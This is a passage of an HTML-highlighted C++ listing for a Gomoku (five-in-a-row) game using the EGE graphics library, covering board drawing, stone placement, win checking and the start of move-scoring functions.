class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;graphics.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">int</span> pos[<span class=\"number\">20</span>][<span class=\"number\">20</span>];<span class=\"comment\">//\t1●\t\t-1○\t\t0×</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> black[<span class=\"number\">20</span>][<span class=\"number\">20</span>], white[<span class=\"number\">20</span>][<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dir[<span class=\"number\">4</span>][<span class=\"number\">2</span>] = &#123; &#123;<span class=\"number\">-1</span>,<span class=\"number\">-1</span>&#125;,&#123;<span class=\"number\">-1</span>,<span class=\"number\">0</span>&#125;,&#123;<span class=\"number\">-1</span>,<span class=\"number\">1</span>&#125;,&#123;<span class=\"number\">0</span>,<span class=\"number\">-1</span>&#125; &#125;;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> key;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">End</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfont(<span class=\"number\">80</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n == <span class=\"number\">1</span>)xyprintf(<span class=\"number\">240</span>, <span class=\"number\">245</span>, <span class=\"string\">&quot;黑方获胜&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> xyprintf(<span class=\"number\">240</span>, <span class=\"number\">245</span>, <span class=\"string\">&quot;白方获胜&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Checker</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; <span class=\"number\">12</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">12</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i + p][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i + <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i + p][j])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i + <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">5</span>; i &lt;= <span class=\"number\">15</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">12</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i - p][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i - <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ChessBoard</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">199</span>, <span class=\"number\">156</span>, <span class=\"number\">124</span>));</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">120</span>; i &lt;= <span class=\"number\">680</span>; i += <span class=\"number\">40</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tline(<span class=\"number\">120</span>, i - <span class=\"number\">80</span>, <span class=\"number\">680</span>, i - <span class=\"number\">80</span>);\t<span class=\"comment\">//X\t120-680</span></span><br><span class=\"line\">\t\tline(i, <span class=\"number\">40</span>, i, <span class=\"number\">600</span>);\t\t\t<span class=\"comment\">//Y\t40-600</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">240</span> - <span class=\"number\">4</span>, <span class=\"number\">160</span> - <span class=\"number\">4</span>, <span class=\"number\">240</span> + <span class=\"number\">4</span>, <span class=\"number\">160</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">240</span> - <span class=\"number\">4</span>, <span class=\"number\">480</span> - <span class=\"number\">4</span>, <span class=\"number\">240</span> + <span class=\"number\">4</span>, <span class=\"number\">480</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">560</span> - <span class=\"number\">4</span>, <span class=\"number\">160</span> - <span class=\"number\">4</span>, <span class=\"number\">560</span> + <span class=\"number\">4</span>, <span class=\"number\">160</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">560</span> - <span class=\"number\">4</span>, <span class=\"number\">480</span> - <span class=\"number\">4</span>, <span class=\"number\">560</span> + <span class=\"number\">4</span>, <span class=\"number\">480</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">400</span> - <span class=\"number\">4</span>, <span class=\"number\">320</span> - <span class=\"number\">4</span>, <span class=\"number\">400</span> + <span class=\"number\">4</span>, <span class=\"number\">320</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;黑体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">40</span>; i &lt;= <span class=\"number\">600</span>; i += <span class=\"number\">40</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">100</span>, i - <span class=\"number\">3</span>, <span class=\"string\">&quot;%d&quot;</span>, (<span class=\"keyword\">int</span>)(i / <span class=\"number\">40</span>));</span><br><span class=\"line\">\t\txyprintf(i + <span class=\"number\">78</span>, <span class=\"number\">20</span>, <span class=\"string\">&quot;%c&quot;</span>, (<span class=\"keyword\">char</span>)(i / <span class=\"number\">40</span> + <span class=\"string\">&#x27;A&#x27;</span> - <span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">40</span>, <span class=\"string\">&quot;当前子数&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;黑: 0&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;白: 0&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Chess</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> color)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (color % <span class=\"number\">2</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\tsetfillcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\tfillellipse(x, y, <span class=\"number\">15</span>, <span class=\"number\">15</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\tfillellipse(x, y, <span class=\"number\">15</span>, <span class=\"number\">15</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Play</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> color)</span><span class=\"comment\">//color: 0●  1○</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx -= <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (x &gt;= <span class=\"number\">1</span> &amp;&amp; x &lt;= <span class=\"number\">15</span> &amp;&amp; y &gt;= <span class=\"number\">1</span> &amp;&amp; y &lt;= <span class=\"number\">15</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pos[x][y])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tChess(x * <span class=\"number\">40</span> + <span class=\"number\">80</span>, y * <span class=\"number\">40</span>, color);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (color)pos[x][y] = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> pos[x][y] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Counter</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">199</span>, <span class=\"number\">156</span>, <span class=\"number\">124</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">50</span>, <span class=\"number\">60</span>, <span class=\"number\">70</span>, <span class=\"number\">120</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;%d&quot;</span>, (n + <span class=\"number\">1</span>) / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;%d&quot;</span>, n / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tbar(<span class=\"number\">0</span>, <span class=\"number\">140</span>, <span class=\"number\">100</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"string\">&quot;白方执棋&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;%d&quot;</span>, n / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;%d&quot;</span>, (n + <span class=\"number\">1</span>) / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tbar(<span class=\"number\">0</span>, <span class=\"number\">140</span>, <span class=\"number\">100</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"string\">&quot;黑方执棋&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">lian5</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ans &gt;= <span class=\"number\">4</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">100</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">100</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live4</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span 